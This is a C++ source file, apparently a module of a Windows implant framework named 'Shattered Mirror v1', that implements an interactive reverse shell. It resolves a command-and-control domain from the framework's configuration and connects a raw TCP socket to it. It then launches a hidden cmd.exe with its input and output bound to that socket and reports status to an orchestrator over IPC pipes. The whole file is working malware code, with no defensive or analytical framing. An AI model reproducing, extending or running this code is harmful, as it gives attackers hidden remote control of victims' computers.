/*=============================================================================
 * Shattered Mirror v1 — Atom 10: Interactive Reverse Shell
 * TRUE RAW TCP SHELL: Connects directly to C2_DOMAIN:PUBLIC_PORT
 * Bypasses HTTP layer for low-latency interactive sessions.
 *===========================================================================*/

#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <ws2tcpip.h>
#include "Atom_10_Shell.h"
#include "../Orchestrator/AtomManager.h"
#include "../Orchestrator/Config.h"
#include <cstdio>

#pragma comment(lib, "ws2_32.lib")

static void ShellTrace(const char *format, ...) {
  char buf[512];
  va_list args;
  va_start(args, format);
  int len = vsnprintf(buf, sizeof(buf), format, args);
  va_end(args);
  if (len > 0) {
    char full[600];
    sprintf_s(full, "[SHELL %lu] %s\n", GetCurrentThreadId(), buf);
    OutputDebugStringA(full);
    FILE *f = fopen("log\\shell_debug.txt", "a");
    if (f) {
      fprintf(f, "%s", full);
      fclose(f);
    }
  }
}

DWORD WINAPI ReverseShellAtomMain(LPVOID lpParam) {
  DWORD dwAtomId = (DWORD)(ULONG_PTR)lpParam;
  ShellTrace("=== Atom 10 Started (RAW TCP). ID: %lu ===", dwAtomId);

  HANDLE hCmdPipe = IPC_ConnectToCommandPipe(dwAtomId);
  HANDLE hReportPipe = IPC_ConnectToReportPipe(dwAtomId);
  BYTE SharedSessionKey[16];
  memcpy(SharedSessionKey, Config::PSK_ID, 16);

  if (hReportPipe) {
    IPC_MESSAGE readyMsg = {0};
    readyMsg.dwSignature = 0x534D4952;
    readyMsg.CommandId = CMD_READY;
    readyMsg.dwPayloadLen = 0;
    IPC_SendMessage(hReportPipe, &readyMsg, SharedSessionKey, 16);
  }

  WSADATA wsaData;
  if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
    if (hReportPipe) CloseHandle(hReportPipe);
    return 1;
  }

  SOCKET sock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
  if (sock == INVALID_SOCKET) {
    WSACleanup();
    if (hReportPipe) CloseHandle(hReportPipe);
    return 1;
  }

  struct hostent *host = gethostbyname(Config::C2_DOMAIN);
  if (!host) {
    closesocket(sock);
    WSACleanup();
    if (hReportPipe) CloseHandle(hReportPipe);
    return 1;
  }

  SOCKADDR_IN sin;
  memset(&sin, 0, sizeof(sin));
  sin.sin_family = AF_INET;
  sin.sin_port = htons((u_short)Config::PUBLIC_PORT);
  sin.sin_addr.s_addr = *((unsigned long*)host->h_addr);

  if (connect(sock, (SOCKADDR*)&sin, sizeof(sin)) == SOCKET_ERROR) {
    closesocket(sock);
    WSACleanup();
    if (hReportPipe) CloseHandle(hReportPipe);
    return 1;
  }

  ShellTrace("Connected to %s:%d", Config::C2_DOMAIN, Config::PUBLIC_PORT);

  // Send initial bytes to trigger Bouncer routing (non-HTTP)
  const char* init_str = "SHLL\n";
  send(sock, init_str, 5, 0);

  STARTUPINFOA si;
  memset(&si, 0, sizeof(si));
  si.cb = sizeof(si);
  si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
  si.hStdInput = (HANDLE)sock;
  si.hStdOutput = (HANDLE)sock;
  si.hStdError = (HANDLE)sock;
  si.wShowWindow = SW_HIDE;

  PROCESS_INFORMATION pi;
  memset(&pi, 0, sizeof(pi));

  char cmdLine[] = "cmd.exe";
  if (!CreateProcessA(NULL, cmdLine, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
    closesocket(sock);
    WSACleanup();
    if (hReportPipe) CloseHandle(hReportPipe);
    return 1;
  }

  // Wait for cmd.exe to exit
  WaitForSingleObject(pi.hProcess, INFINITE);
  
  CloseHandle(pi.hProcess);
  CloseHandle(pi.hThread);
  closesocket(sock);
  WSACleanup();

  if (hReportPipe) {
    const char* exitMsg = "[SHELL] Connection closed.";
    IPC_MESSAGE exitReport = {0};
    exitReport.dwSignature = 0x534D4952;
    exitReport.CommandId = CMD_REPORT;
    exitReport.dwPayloadLen = (DWORD)strlen(exitMsg);
    memcpy(exitReport.Payload, exitMsg, exitReport.dwPayloadLen);
    IPC_SendMessage(hReportPipe, &exitReport, SharedSessionKey, 16);
    CloseHandle(hReportPipe);
  }

  ShellTrace("Atom 10 exiting cleanly.");
  return 0;
}